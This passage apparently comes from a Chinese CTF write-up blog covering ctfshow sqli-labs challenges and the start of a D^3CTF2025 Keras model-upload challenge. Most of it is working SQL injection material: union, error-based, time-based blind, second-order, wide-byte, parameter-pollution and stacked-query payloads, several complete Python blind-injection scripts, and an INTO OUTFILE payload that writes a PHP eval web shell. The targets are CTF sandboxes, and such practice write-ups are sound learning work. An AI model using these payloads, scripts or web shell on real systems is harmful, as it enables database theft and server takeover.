正常回显查询信息\n```\n\n然后我们用union联合注入\n\n```\n?id=-1' union select 1,2,'3 2和3有回显\n\n?id=-1' union select 1,(select group_concat(table_name)from information_schema.tables where table_schema='ctfshow'),'3 表名为flag\n\n?id=-1' union select 1,(select group_concat(column_name)from information_schema.columns where table_name='flag'),'3 字段名有flag4\n\n?id=-1' union select 1,(select flag4 from ctfshow.flag),'3\n```\n\n## web540\n\n### #二次注入\n\n一个登录口，忘记密码的选项没什么用，登录口也没什么注入的地方\n\n找到一个注册口new_user.php，这里的话注册发现传入特殊字符之后会被转义，所以我们打二次注入\n\n猜测登录后的修改密码的语句是单引号闭合，我们注册一个`admin'#`的账号\n\n![image-20250604165535512](../image/achieve/202411/sqli-labs/image-20250604165535512.png)\n\n然后在里面修改密码，猜测后台修改密码的语句是\n\n```\n$sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'\"\n```\n\n所以插入后如果特殊字符不被转义的话就能进行注入攻击，但是这里没有回显，我们只能打盲注\n\n我们先测一下延迟时间\n\n先注册一个能延迟的语句\n\n```\nusername=admin' and if(1<2,sleep(3),0)#\npassword=1\nre_password=1\n```\n\n然后修改密码的时候触发，发现延迟就是3秒左右，那我们写脚本吧\n\n需要注意的是，这里需要用到session，不然登录的时候会出问题\n\n```python\nimport requests\nimport time\n\nurl1 = \"http://0d2bb73c-44f6-47a6-8fd1-9bb1093d0528.challenge.ctf.show/login_create.php\"\nurl2 = \"http://0d2bb73c-44f6-47a6-8fd1-9bb1093d0528.challenge.ctf.show/pass_change.php\"\nurl3 = \"http://0d2bb73c-44f6-47a6-8fd1-9bb1093d0528.challenge.ctf.show/login.php\"\ni = 0\ntarget = \"\"\nsession = requests.session()\n\n\nwhile True:\n    i = i + 1\n    head = 32\n    tail = 127\n    while head < tail:\n        mid = (head + tail) // 2\n\n        #注册页面传入恶意数据\n        #payload1 = f\"admin' and if(ascii(substr((select group_concat(schema_name)from information_schema.schemata),{i},1))>{mid},sleep(3),0)-- \"\n        #payload1 = f\"admin' and if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctfshow'),{i},1))>{mid},sleep(3),0)-- \"\n        #payload1 = f\"admin' and if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='flag'),{i},1))>{mid},sleep(3),0)-- \"\n        payload1 = f\"admin' and if(ascii(substr((select flag4 from ctfshow.flag),{i},1))>{mid},sleep(3),0)-- \"\n        data1 = {\n            \"username\": payload1,\n            \"password\": \"1\",\n            \"re_password\": \"1\",\n            'submit': 'Register'\n        }\n        r1 = session.post(url1, data=data1)\n\n        #登录账号\n        data2 = {\n            \"login_user\" : payload1,\n            \"login_password\" : \"1\",\n            'mysubmit': 'Login'\n        }\n        r2 = session.post(url3, data=data2)\n\n        #触发注入\n        data3 = {\n            \"current_password\" : \"1\",\n            \"password\": \"1\",\n            \"re_password\": \"1\",\n            'submit': 'Reset'\n        }\n\n        start = time.time()\n        r3 = session.post(url2, data=data3)\n        end = time.time() - start\n        if end > 2.5:\n            head = mid + 1\n        else:\n            tail = mid\n\n    if head != 32 :\n        target += chr(head)\n        print(target)\n    else :\n        break\nprint(target)\n```\n\n## web541&542\n\n### #过滤and和or\n\n页面提示过滤了and和or，用管道符绕过就行了，`and`用`&&`替换，`or`用`||`替换，当然也可以用双写去绕过，因为后面打注入的时候需要绕过，刚好这里只是做了一个替换的过滤\n\n```\n?id=-1'||'1'='1'--+回显\n?id=-1'||'1'='2'--+无回显\n```\n\n后面的话可以打盲注也可以打报错注入，不过我自己报错注入学的比较少，所以还是选择迎难而上 打extractvalue报错\n\n```\n?id=-1'||extractvalue(1,concat(0x7e,(select version()),0x7e))--+\n\n?id=-1'||extractvalue(1,concat(0x7e,(select group_concat(schema_name)from infoorrmation_schema.schemata),0x7e))--+\n\n?id=-1'||extractvalue(1,concat(0x7e,(select group_concat(table_name)from infoorrmation_schema.tables where table_schema='ctfshow'),0x7e))--+\n\n?id=-1'||extractvalue(1,concat(0x7e,(select group_concat(column_name)from infoorrmation_schema.columns where table_name='flags'),0x7e))--+\n\n?id=-1'||extractvalue(1,concat(0x7e,left((select flag4s from ctfshow.flags),30),0x7e))--+\n?id=-1'||extractvalue(1,concat(0x7e,right((select flag4s from ctfshow.flags),30),0x7e))--+\n```\n\n## web543\n\n### #增加过滤space和注释\n\n这道题增加过滤了空格和注释，注释可以用单引号主动闭合，空格的话我发现编码绕不过去，只能用括号绕过了\n\n其实报错注入的话也是不怎么需要空格的，可以打报错注入\n\n```mysql\n?id=-1'||updatexml(1,concat(0x7e,(version()),0x7e),1)||'\n\n?id=-1'||updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(infoorrmation_schema.schemata)),0x7e),1)||'\n\n?id=-1'||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='ctfshow')),0x7e),1)||'\n\n?id=-1'||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='flags')),0x7e),1)||'\n```\n\n盲注也是可以的\n\n```mysql\n?id=0'||if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='ctfshow')),{i},1))>{mid},1,0)||'0\n```\n\n## web544\n\n### #增加过滤space和注释\n\n这次就用盲注吧，不过这里得用id=0，id=-1的结果是查得出来的\n\n```\n?id=0'||if(1>0,1,0)||'有回显\n?id=0'||if(1<0,1,0)||'无回显\n```\n\n然后写脚本\n\n```python\nimport requests\n\nurl = \"http://8189ea51-4f5f-49f1-b344-3b556d3c79ce.challenge.ctf.show/\"\ni = 0\ntarget = \"\"\n\nwhile True:\n    i += 1\n    head = 32\n    tail = 127\n    while head < tail:\n        mid = (head + tail) // 2\n\n        #payload = f\"?id=0'||if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='ctfshow')),{i},1))>{mid},1,0)||'\"\n        #payload = f\"?id=0'||if(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='flags')),{i},1))>{mid},1,0)||'\"\n        payload = f\"?id=0'||if(ascii(substr((select(flag4s)from(ctfshow.flags)),{i},1))>{mid},1,0)||'\"\n        r = requests.get(url + payload)\n        if \"Dumb\" in r.text:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        target += chr(head)\n        print(target)\n    else:\n        break\nprint(target)\n\n```\n\n## web545\n\n### #单引号增加过滤union和select\n\n这次好像and和or没被过滤了，但是过滤了union和select，可以用大小写或者双写绕过\n\n```\n?id=-1'||updatexml(1,concat(0x7e,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema='ctfshow')),0x7e),1)||'\n\n?id=-1'||updatexml(1,concat(0x7e,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name='flags')),0x7e),1)||'\n\n?id=-1'||updatexml(1,concat(0x7e,left((sElect(flag4s)from(ctfshow.flags)),30),0x7e),1)||'\n?id=-1'||updatexml(1,concat(0x7e,right((sElect(flag4s)from(ctfshow.flags)),30),0x7e),1)||'\n```\n\n## web546\n\n### #双引号增加过滤union和select\n\n```\n?id=0\"||0||\" 无回显\n?id=0\"||1||\" 有回显\n```\n\n好像报错信息被禁用了无法打报错注入，那就打盲注吧\n\n```\n?id=0\"||if(ascii(substr((sElect(version())),1,1))>0,1,0)||\" 有回显\n?id=0\"||if(ascii(substr((sElect(version())),1,1))<0,1,0)||\" 无回显\n```\n\n写脚本\n\n```python\nimport requests\n\nurl = \"http://f4301b5e-9fd1-4fcb-b46a-20176eba89fa.challenge.ctf.show/\"\ni = 0\ntarget = \"\"\n\nwhile True:\n    i += 1\n    head = 32\n    tail = 127\n    while head < tail:\n        mid = (head + tail) // 2\n\n        #payload = f'?id=0\"||if(ascii(substr((sElect(group_concat(table_name))from(information_schema.tables)where(table_schema=\\'ctfshow\\')),{i},1))>{mid},1,0)||\"'\n        #payload = f'?id=0\"||if(ascii(substr((sElect(group_concat(column_name))from(information_schema.columns)where(table_name=\\'flags\\')),{i},1))>{mid},1,0)||\"'\n        payload = f'?id=0\"||if(ascii(substr((sElect(flag4s)from(ctfshow.flags)),{i},1))>{mid},1,0)||\"'\n        r = requests.get(url + payload)\n        if \"Dumb\" in r.text:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        target += chr(head)\n        print(target)\n    else:\n        break\nprint(target)\n\n```\n\n我发现union和select的一些大小写格式也是被过滤的\n\n```\nunion Union UNION select Select SELECT\n```\n\n## web547&548\n\n### #单引号+括号增加过滤union和select\n\n```\n?id=0')||0||(' 无回显\n?id=0')||1||(' 有回显\n```\n\n这道题也不能用报错注入\n\n```python\nimport requests\n\nurl = \"http://30af16dd-d082-4c7d-9485-b4b0acbc4aec.challenge.ctf.show/\"\ni = 0\ntarget = \"\"\n\nwhile True:\n    i += 1\n    head = 32\n    tail = 127\n    while head < tail:\n        mid = (head + tail) // 2\n\n        #payload = f\"?id=0')||if(ascii(substr((sElect(group_concat(table_name))from(information_schema.tables)where(table_schema='ctfshow')),{i},1))>{mid},1,0)||('\"\n        #payload = f\"?id=0')||if(ascii(substr((sElect(group_concat(column_name))from(information_schema.columns)where(table_name='flags')),{i},1))>{mid},1,0)||('\"\n        payload = f\"?id=0')||if(ascii(substr((sElect(flag4s)from(ctfshow.flags)),{i},1))>{mid},1,0)||('\"\n        r = requests.get(url + payload)\n        if \"Dumb\" in r.text:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        target += chr(head)\n        print(target)\n    else:\n        break\nprint(target)\n\n```\n\n## web549\n\n### #单引号+Http参数污染\n\n这道题的话其实没怎么看懂，好像只能输入数字？\n\n其实就是两层服务器，具体架构如下\n\n![image-20250605105502016](../image/achieve/202411/sqli-labs/image-20250605105502016.png)\n\n一层服务器也就是tomcat的jsp型服务器负责对传入数据进行过滤和处理，就相当于WAF（Web应用防火墙）\n\n然后真正处理查询语句的服务器是apache的php服务器，但是测试发现我们传入一个参数的话他会检测参数的内容是否为数字，但是如果我们同时传入两个参数的话Apache PHP 会解析最后一个参数，Tomcat JSP 会解析第一个参数，所以我们可以利用第二个参数进行注入\n\ndeepseek给了一个很好的参数处理流程图\n\n![image-20250605105758882](../image/achieve/202411/sqli-labs/image-20250605105758882.png)\n\n然后我们测试一下\n\n```\n?id=1&id=2\n```\n\n成功返回id为2的数据结果，所以真正被执行的是第二个参数\n\n后面的话直接打联合注入就行\n\n```\n?id=1&id=-1' union select 1,2,3--+\n\n?id=1&id=-1' union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema='ctfshow')--+\n\n?id=1&id=-1' union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name='flags')--+\n\n?id=1&id=-1' union select 1,2,(select flag4s from ctfshow.flags)--+\n```\n\n## web550\n\n### #双引号+Http参数污染\n\n和上一题是一样的，不过闭合方式变成了双引号闭合\n\n## web551\n\n### #双引号括号+Http参数污染\n\n和上一题是一样的，不过闭合方式变成了双引号括号闭合\n\n## web552\n\n### #单引号宽字节注入1\n\n这里有对传入值的预处理，假如我们传入`1'`\n\n![image-20250605110119877](../image/achieve/202411/sqli-labs/image-20250605110119877.png)\n\n可以看到返回的值的单引号被转义了，并且还返回了十六进制字符串的结果，既然被转义的话，那我们看看是否能将单引号转义呢\n\n`%df'`=>`%df\\'`（单引号会被加上转义字符\\）\n\n`%df\\'`=>`%df%5c'`（\\的十六进制为%5c）\n\n`%df%5c'`=>`縗'`（GBK编码时会认为这时一个宽字节）\n\n这样就会使得单引号被逃逸出去\n\n试一下\n\n```\n?id=%df' 出现报错\n?id=%df'or 1--+\n```\n\n发现成功回显，那我们正常打注入\n\n```\n?id=%df'union select 1,2,3--+\n?id=%df'union select 1,2,(select group_concat(table_name)from information_schema.tables)--+\n?id=%df'union select 1,2,(select group_concat(column_name)from information_schema.columns)--+\n?id=%df'union select 1,2,(select flag4s from ctfshow.flags)--+\n```\n\n查表时没法用where table_schema='ctfshow'里面有`'`，但是因为前面的字符串逃逸了，后面的%df可能被认为是字符串包裹的一部分？这里逃不过去\n\nsqlmap中同时也存在宽字节绕过的脚本unmagicquotes.py\n\n```\nsqlmap -u \"ip\" --tamper=\"unmagicquotes.py\" --batch\n```\n\n## web553\n\n### #addslashes宽字节GET\n\n这道题其实和上一题是一样的，只不过防御手法的实现不一样\n\nweb552的防御手法\n\n```php\nif(isset($_GET['id']))\n$id=check_addslashes($_GET['id']);\n\n# 在' \" \\ 等敏感字符前面添加反斜杠\nfunction check_addslashes($string)\n{        # \\ 转换为 \\\\\n    $string = preg_replace('/'. preg_quote('\\\\') .'/', \"\\\\\\\\\\\\\", $string);          将       # 将 ' 转为\\\"\n    $string = preg_replace('/\\'/i', '\\\\\\'', $string);   \n      # 将 \" 转为\\\"\n    $string = preg_replace('/\\\"/', \"\\\\\\\"\", $string);                                \n    return $string;\n}\n```\n\nweb553的防御手法\n\n```php\nfunction check_addslashes($string)\n{\n    $string= addslashes($string);    \n    return $string;\n}\n```\n\n`addslashes()` 函数返回在预定义字符之前添加反斜杠的字符串。\n\n| 预定义字符 | 转义后 |\n| ---------- | ------ |\n| `\\`        | `\\\\`   |\n| `'`        | `\\'`   |\n| `\"`        | `\\\"`   |\n\n本质上这两个函数都是一样的，不过一个是自定义的一个是自带的\n\n**Notice**：使用addslashes(),我们需要将 mysql_query 设置为binary的方式，才能防御此漏洞。\n\n## web554\n\n### #addslashes宽字节POST\n\n```php\n$uname = addslashes($uname1);\n$passwd= addslashes($passwd1);\n```\n\n过滤方法是一样的，所以两个都可以注入\n\n在Mysql注入天书中提到：在Post请求中，此处介绍一个新方法：将utf-8转换为 utf-16 或 utf-32，例如将 ' 转为utf-16的 �' 。这里的�是有由类似%%%的东西组成的，然后再加上 ' (即%27)，然后相当于urlencode后类似 %EF%BF%%BD%27 的东西，然后是宽字符漏铜，%EF%BF会组成一个中文字符，而%BD%27也会被当成中文字符，然后php不会进行转义。然后语句流到mysql的时候，Mysql会将三个%转为一个中文字符，然后剩下%27作为引号，以此进行注入。\n\n```\nuname=�' or 1--+&passwd=1\n```\n\n不知道为啥这里在页面传参没回显但是在yakit抓包传参就可以\n\n![image-20250605121347058](../image/achieve/202411/sqli-labs/image-20250605121347058.png)\n\n最后的请求包\n\n```\nPOST / HTTP/1.1\nHost: b29ea5fa-d85c-4667-98a6-0249a32a933a.challenge.ctf.show\nConnection: keep-alive\nContent-Length: 30\nCache-Control: max-age=0\nsec-ch-ua: \"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nOrigin: https://b29ea5fa-d85c-4667-98a6-0249a32a933a.challenge.ctf.show\nContent-Type: application/x-www-form-urlencoded\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://b29ea5fa-d85c-4667-98a6-0249a32a933a.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br, zstd\nAccept-Language: zh-CN,zh;q=0.9\nCookie: cf_clearance=ZuK66QChNGftyyiGS39xGqXjRvrgqwc7dpOpwNp8hgY-1747317016-1.2.1.1-SHtYMtmhonoQh3f9JFLxlX5e8ZPl2H.d.1t6d9JUkU8A48zWJ8kwl3L9eAExpcFayYenFfR8OxZ7NWlafUA3eW..1Ql.yEeMVQsO2dN0LeOWb9v9mBTw9f9lNiJBsuz0wNfBuxQoVypAzPhH9KeUpkB22hemlwS35.DR.pfloutzMUBCc7K.SMPWBv0hD22WPrXL6TOwx.8Vlv0exiJGfJydMDF8Fmgi7BwFDHfm8A27bqv1xzCh1xdEneeUo.dok_1cBQWYDpbP2ClHu0miDKBW2hnvhGXG7HbMovGYSE3c1QFXa0TPiCQYSEXDX_10Bnlxz9QrXZujCxO7ZGcQA_vDxzoYodJRpDZrLpAsbq8\n\nuname=%df'union select 1,(select flag4s from ctfshow.flags)--+&passwd=1&submit=Submit\n```\n\n## web555\n\n### #数字型的注入\n\n这次虽然转义了，但是不影响我们数字型的注入\n\n```\n?id=0 or 1=1\n```\n\n然后直接打就行\n\n```\n?id=0 union select 1,2,(select flag4s from ctfshow.flags)\n```\n\n如果在查询语句中需要用到引号利用指明数据库名或表名的话，可以用子查询语句表示字符串\n\n```\nunion select 1,(select group_concat(table_name) from information_schema.tables where table_schema=(select schema_name from information_schema.schemata limit 1))\n```\n\n通过limit限制查询内容，从而拿到我们需要的数据作为字符串去查询\n\n## web556\n\n### #mysql_real_escape_string宽字节GET\n\n这次的话检测函数换成了mysql_real_escape_string\n\n```php\n$id=check_quotes($_GET['id']);\n\nfunction check_quotes($string)\n{\n    $string= mysql_real_escape_string($string);    \n    return $string;\n}\n```\n\nmysql_real_escape_string 会检测并转义如下危险字符：\n\n| 危险字符 | 转义后 |\n| -------- | ------ |\n| `\\`      | `\\\\`   |\n| `'`      | `\\'`   |\n| `\"`      | `\\\"`   |\n\n正常注入就行\n\n```\n?id=-1%df' union select 1,2,(select group_concat(table_name)from information_schema.tables where table_schema=(select schema_name from information_schema.schemata limit 1))--+\n\n?id=-1%df' union select 1,2,(select group_concat(column_name)from information_schema.columns where table_name=(select table_name from information_schema.tables limit 1))--+\n\n?id=-1%df' union select 1,2,(select flag4s from ctfshow.flags)--+\n```\n\n## web557\n\n### #mysql_real_escape_string宽字节POST\n\n和556一样的函数处理，但是换成了POST传参，用yakit发包\n\n``` php\nPOST / HTTP/1.1\nHost: bbd41d07-549c-4094-b38a-fb8c3a7589c3.challenge.ctf.show\nConnection: keep-alive\nContent-Length: 37\nCache-Control: max-age=0\nsec-ch-ua: \"Google Chrome\";v=\"137\", \"Chromium\";v=\"137\", \"Not/A)Brand\";v=\"24\"\nsec-ch-ua-mobile: ?0\nsec-ch-ua-platform: \"Windows\"\nOrigin: https://bbd41d07-549c-4094-b38a-fb8c3a7589c3.challenge.ctf.show\nContent-Type: application/x-www-form-urlencoded\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nReferer: https://bbd41d07-549c-4094-b38a-fb8c3a7589c3.challenge.ctf.show/\nAccept-Encoding: gzip, deflate, br, zstd\nAccept-Language: zh-CN,zh;q=0.9\nCookie: cf_clearance=ZuK66QChNGftyyiGS39xGqXjRvrgqwc7dpOpwNp8hgY-1747317016-1.2.1.1-SHtYMtmhonoQh3f9JFLxlX5e8ZPl2H.d.1t6d9JUkU8A48zWJ8kwl3L9eAExpcFayYenFfR8OxZ7NWlafUA3eW..1Ql.yEeMVQsO2dN0LeOWb9v9mBTw9f9lNiJBsuz0wNfBuxQoVypAzPhH9KeUpkB22hemlwS35.DR.pfloutzMUBCc7K.SMPWBv0hD22WPrXL6TOwx.8Vlv0exiJGfJydMDF8Fmgi7BwFDHfm8A27bqv1xzCh1xdEneeUo.dok_1cBQWYDpbP2ClHu0miDKBW2hnvhGXG7HbMovGYSE3c1QFXa0TPiCQYSEXDX_10Bnlxz9QrXZujCxO7ZGcQA_vDxzoYodJRpDZrLpAsbq8\n\nuname=1%df'+union+select+1,(select+flag4s+from+ctfshow.flags)--+&passwd=1&submit=Submit\n```\n\n## web558\n\n### #堆叠注入\n\n先看看该题目堆叠注入的代码是怎么实现的\n\n```\n# id 参数直接带入到 SQL 语句中\n$id=$_GET['id'];\n$sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\";\nif (mysqli_multi_query($con1, $sql)):\n    输出查询信息\nelse:\n    print_r(mysqli_error($con1));\n```\n\n`mysqli_multi_query` 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。\n\n既然这样的话我们尝试插入数据\n\n```\n?id=20';insert into users(id,username,password) values (20,(select user()),\"test\")--+\n?id=20\n```\n\n需要传两次，第一次是执行插入语句，第二次是查询\n\n说明这里是可以进行堆叠注入的，那我们将注入的语句得到的结果插入表中\n\ninsert into插入语句是不能覆盖原有数据的，所以id得一直改新的\n\n```\n?id=1';insert into users(id,username,password) values (21,(select version()),\"test\")--+\n\n?id=1';insert into users(id,username,password) values (22,(select group_concat(schema_name)from information_schema.schemata),\"test\")--+\n\n?id=1';insert into users(id,username,password) values (24,(select group_concat(table_name)from information_schema.tables where table_schema='ctfshow'),\"test\")--+\n\n?id=1';insert into users(id,username,password) values (26,(select group_concat(column_name)from information_schema.columns where table_name='flags'),\"test\")--+\n\n?id=1';insert into users(id,username,password) values (27,(select group_concat(flag4s) from ctfshow.flags),\"test\")--+\n```\n\n不知道为什么，在爆flag和数据库的时候爆不出来，后面只能打联合注入了\n\n```\n?id=-1' union select 1,2,(select flag4s from ctfshow.flags)--+\n```\n\n## web559\n\n### #数字型联合注入\n\n直接打联合注入吧\n\n```\n?id=-1 union select 1,2,(select flag4s from ctfshow.flags)\n```\n\n## web560\n\n### #单引号括号联合注入\n\n```\n?id=0') union select 1,2,3--+\n```\n\n和之前的相比只是闭合方式\n\n```\n?id=0') union select 1,2,(select flag4s from ctfshow.flags)--+\n```\n\n## web561\n\n还是数字型联合注入？？？这是什么出题顺序，我甚至怀疑是不是我自己漏了知识点\n\n## web562\n\n### #POST单引号报错注入\n\n一个登录界面\n\n传入`1'/1'`有报错信息，但是这个貌似没有回显结果，考虑报错注入或者盲注吧\n\n```\nlogin_password=1%27&login_user=1&mysubmit=Login\n```\n\n测了一下注入点在password\n\n```\nlogin_password=1%27+or+(select+updatexml(1,concat(0x7e,(select version()),0x7e),1))--+&login_user=1&mysubmit=Login\n\nlogin_password=1%27+or+(select+updatexml(1,concat(0x7e,(select flag4s from ctfshow.flags),0x7e),1))--+&login_user=1&mysubmit=Login\n\nlogin_password=1%27+or+(select+updatexml(1,concat(0x7e,right((select flag4s from ctfshow.flags),30),0x7e),1))--+&login_user=1&mysubmit=Login\n```\n\n## web563\n\n### #POST单引号括号报错注入\n\n```\nlogin_password=1%27)+or+(select+updatexml(1,concat(0x7e,left((select flag4s from ctfshow.flags),30),0x7e),1))--+&login_user=1&mysubmit=Login\n\nlogin_password=1%27+or+(select+updatexml(1,concat(0x7e,right((select flag4s from ctfshow.flags),30),0x7e),1))--+&login_user=1&mysubmit=Login\n```\n\n## web564\n\n### #order by报错注入\n\n```php\n# GET 方式获取 sort 参数\n$id=$_GET['sort'];\n\n# 直接将 id 带入 SQL 中\n$sql = \"SELECT * FROM users ORDER BY $id\";\n\nif 查询成功：\n    输出查询信息\nelse：\n    print_r(mysql_error());\n```\n\norder by 后面不能跟联合注入，例如我们传入?sort=1\n\n![image-20250605182533287](../image/achieve/202411/sqli-labs/image-20250605182533287.png)\n\n此时结果集会按照第一列的顺序排列输出，那么这里的话可以打报错注入或者时间盲注\n\n如果是时间盲注的话直接在后面加上注入语句就行了\n\n```\nif(substr(database(),{i},1)='{char}',sleep(0.05),0)\n```\n\n```python\nimport requests\nimport time\n\nurl = \"http://2b259308-bc30-412a-ac3b-7e8977e97f94.challenge.ctf.show/\"\ni = 0\ntarget = \"\"\n\nwhile True:\n    i += 1\n    head = 32\n    tail = 127\n    while head < tail:\n        mid = (head + tail) // 2\n\n        payload = f\"?sort=if(ascii(substr((select flag4s from ctfshow.flags),{i},1))>{mid},sleep(0.25),1)\"\n\n        start = time.time()\n        r = requests.get(url + payload)\n        end = time.time() - start\n        if end > 2.5:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        target += chr(head)\n        print(target)\n    else:\n        break\nprint(target)\n\n```\n\n当然也可以直接用报错注入\n\n```\n/?sort=1'and updatexml(1,concat(0x7e,(select version()),0x7e),1)--+\n```\n\n另外也可以传马，这种方法我没有成功，可能设置了权限吧\n\n## web565\n\n### #单引号 order by报错注入\n\n```\n/?sort=1'and updatexml(1,concat(0x7e,(select flag4s from ctfshow.flags),0x7e),1)--+\n/?sort=1'and updatexml(1,concat(0x7e,right((select flag4s from ctfshow.flags),30),0x7e),1)--+\n```\n\n## web566\n\n### #order by盲注\n\n和 上题 相比少了报错注入，时间盲注依然可以正常使用\n\n```\n?sort=if(1,sleep(0.25),1)\n```\n\n```python\nimport requests\nimport time\n\nurl = \"http://a67753c2-c7b7-42dd-a6ba-85be30c1e30d.challenge.ctf.show/\"\ni = 0\ntarget = \"\"\n\nwhile True:\n    i += 1\n    head = 32\n    tail = 127\n    while head < tail:\n        mid = (head + tail) // 2\n\n        payload = f\"?sort=if(ascii(substr((select flag4s from ctfshow.flags),{i},1))>{mid},sleep(0.25),1)\"\n\n        start = time.time()\n        r = requests.get(url + payload)\n        end = time.time() - start\n        if end > 2.5:\n            head = mid + 1\n        else :\n            tail = mid\n    if head != 32:\n        target += chr(head)\n        print(target)\n    else:\n        break\nprint(target)\n\n```\n\n## web567\n\n### #order by 写文件\n\n盲注打太慢了，换一种方法，用line terminated by 写文件\n\n```\n/?sort=1 into outfile \"/var/www/html/1.php\" lines terminated by 0x3c3f706870206576616c28245f504f53545b315d293b3f3e2020--+\n\n0x3c3f706870206576616c28245f504f53545b315d293b3f3e2020--+是<?php eval($_POST[1]);?>  的十六进制\n```\n\n访问后连蚁剑\n\n找到数据库文件\n\n![image-20250605192659763](../image/achieve/202411/sqli-labs/image-20250605192659763.png)\n\n连数据库拿flag就行\n\n![image-20250605193039640](../image/achieve/202411/sqli-labs/image-20250605193039640.png)\n\n![image-20250605193055295](../image/achieve/202411/sqli-labs/image-20250605193055295.png)\n\n这里使用的是mysqli_multi_query()函数，而之前使用的是mysqli_query()。区别在于mysqli_multi_query()可以执行多个sql 语句，而mysqli_query()只能执行一个sql 语句。因此我们可以注入执行多个sql 语句注入 statcked injection。\n\n## web568\n\n### #单引号order by 写文件\n\n```\n?sort=1' into outfile \"/var/www/html/1.php\" lines terminated by 0x3c3f706870206576616c28245f504f53545b315d293b3f3e2020--+\n```\n\n![image-20250605193335124](../image/achieve/202411/sqli-labs/image-20250605193335124.png)\n\n## 总结\n\n刷了一天半总算是给刷完了，学到了很多姿势，但是不得不说一种姿势出好几道题真的没必要，只不过是换了闭合方式，可能是因为比较基础吧，巩固基础来着s\n","tags":["sqli-labs"],"categories":["ctfshow"]},{"title":"D^3CTF2025","url":"/2025/06/03/D-3CTF2025/","content":"\n## d3model\n\nI created a checker simply to verify the model's loading functionality.\n\n```\nThere's a size limit for uploaded files, so avoid uploading very large ones\n```\n\n附件有一个app.py\n\n```python\nimport keras\nfrom flask import Flask, request, jsonify\nimport os\n\n\ndef is_valid_model(modelname):\n    try:\n        keras.models.load_model(modelname)\n    except:\n        return False\n    return True\n\napp = Flask(__name__)\n\n@app.route('/', methods=['GET'])\ndef index():\n    return open('index.html').read()\n\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'file' not in request.files:\n        return jsonify({'error': 'No file part'}), 400\n    \n    file = request.files['file']\n    \n    if file.filename == '':\n        return jsonify({'error': 'No selected file'}), 400\n    \n    MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB\n    file.seek(0, os.SEEK_END)\n    file_size = file.tell()\n    file.seek(0)\n    \n    if file_size > MAX_FILE_SIZE:\n        return jsonify({'error': 'File size exceeds 50MB limit'}), 400\n    \n    filepath = os.path.join('./', 'test.keras')\n    if os.path.exists(filepath):\n        os.remove(filepath)\n    file.save(filepath)\n    \n    if is_valid_model(filepath):\n        return jsonify({'message': 'Model is valid'}), 200\n    else:\n        return jsonify({'error': 'Invalid model file'}), 400\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', port=5000)\n```\n\n分析一下源代码\n\n```python\ndef is_valid_model(modelname):\n    try:\n        keras.models.load_model(modelname)\n    except:\n        return False\n    return True\n```\n\n这里的话用**`keras.models.load_model`**函数从文件或目录中加载通过保存的模型`model.save()`。\n\n参考官方文档：https://keras.io/api/models/model_saving_apis/model_saving_and_loading/\n\n![image-20250603103126521](../image/achieve/202411/D3CTF/image-20250603103126521.png)\n\n然后就是检查文件的部分\n\n```python\ndef upload_file():\n    if 'file' not in request.files:\n        return jsonify({'error': 'No file part'}), 400\n    \n    file = request.files['file']\n    \n    if file.filename == '':\n        return jsonify({'error': 'No selected file'}), 400\n    \n    MAX_FILE_SIZE = 50 * 1024 * 1024  # 50MB\n    file.seek(0, os.SEEK_END)\n    file_size = file.tell()\n    file.seek(0)\n    \n    if file_size > MAX_FILE_SIZE:\n        return jsonify({'error': 'File size exceeds 50MB limit'}), 400\n    \n    filepath = os.path.join('./', 'test.keras')\n    if os.path.exists(filepath):\n        os.remove(filepath)\n    file.save(filepath)\n    \n    if is_valid_model(filepath):\n        return jsonify({'message': 'Model is valid'}), 200\n    else:\n        return jsonify({'error': 'Invalid model file'}), 400\n```\n\n- 先是检测文件是否上传，并从请求中获取文件对象，后面就是检测文件的大小了\n\n检测通过后保存文件到当前目录下的test.keras，如果文件存在则覆盖，之后用上面的函数加载该文件\n\ntest.keras文件是什么呢？`.keras`后缀文件是Keras3.0默认的模型保存文件，替代了以往的**HDF5（.h5）** 和 **TensorFlow 